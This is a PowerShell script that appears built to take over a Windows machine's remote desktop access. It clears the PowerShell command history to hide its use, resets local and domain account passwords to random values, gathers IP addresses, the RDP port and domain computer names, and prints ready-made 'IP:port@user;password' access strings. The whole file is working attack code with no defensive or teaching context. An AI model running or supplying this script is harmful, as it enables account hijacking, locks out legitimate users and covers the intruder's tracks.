Clear-Host
Remove-Item (Get-PSReadlineOption).HistorySavePath

$currentOnly = Read-Host "[!] are you need do this only current user? "

Clear-Host

Function Generate-Password($length = 30) {
    $lower = "abcdefghijklmnopqrstuvwxyz".ToCharArray()
    $upper = "ABCDEFGHIJKLMNOPQRSTUVWXYZ".ToCharArray()
    $digits = "0123456789".ToCharArray()
    $symbols = "!@#$%+=-".ToCharArray()
    $all = $lower + $upper + $digits + $symbols

    $password = @()
    $password += $lower | Get-Random
    $password += $upper | Get-Random
    $password += $digits | Get-Random
    $password += $symbols | Get-Random
    $remaining = $length - 4
    $password += 1..$remaining | ForEach-Object { $all | Get-Random }

    -join ($password | Get-Random -Count $password.Count)
}

$users = @("HomeGroupUser", "Other user")
$passwords = @{}

if ($currentOnly -eq '1') {
    $currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name.Split('\')[1]
    $password = Generate-Password
    net user "$currentUser" $password
    $passwords[$currentUser] = $password
} else {
    foreach ($user in $users) {
        $password = Generate-Password
        try {
            net user "$user" $password > $null 2>&1
            net user "$user" $password /domain > $null 2>&1
            $passwords[$user] = $password
        } catch {
            Write-Host "[!] failed to set password for '$user'"
        }
    }
}

Write-Host "`n=== all ip adapters ==="
Get-NetIPAddress | Where-Object { $_.IPAddress -match '\d+\.\d+\.\d+\.\d+' } | ForEach-Object {
    Write-Host $_.InterfaceAlias":" $_.IPAddress
}

try {
    $publicIP = Invoke-RestMethod -Uri "https://checkip.amazonaws.com"
} catch {
    $publicIP = "Unknown"
}

try {
    $rdpPortReg = Get-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" -Name "PortNumber"
    $rdpPort = $rdpPortReg.PortNumber
} catch {
    $rdpPort = 3389
}

Write-Host "`n=== domain ==="
try {
    $compSys = Get-WmiObject Win32_ComputerSystem
    if ($compSys.PartOfDomain) {
        Write-Host "domain: $($compSys.Domain)"
        try {
            $domainComputers = Get-ADComputer -Filter * -Property Name | Select-Object -ExpandProperty Name
            Write-Host "computers in domain:"
            $domainComputers | ForEach-Object { Write-Host " - $_" }
        } catch {
            Write-Host "error get list of computers on domain"
        }
    } else {
        Write-Host "workgroup: $($compSys.Workgroup)"
    }
} catch {
    Write-Host "could not determine domain or workgroup information"
}

Write-Host "`n=== whoami ==="
whoami

Write-Host "`n=== information ==="
if ($currentOnly -eq '1') {
    $user = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
    Write-Host -NoNewline "$publicIP:$rdpPort@$user;$($passwords[$currentUser])"
} else {
    foreach ($user in $users) {
        Write-Host -NoNewline "$publicIP:$rdpPort@$user;$($passwords[$user])"
    }
}
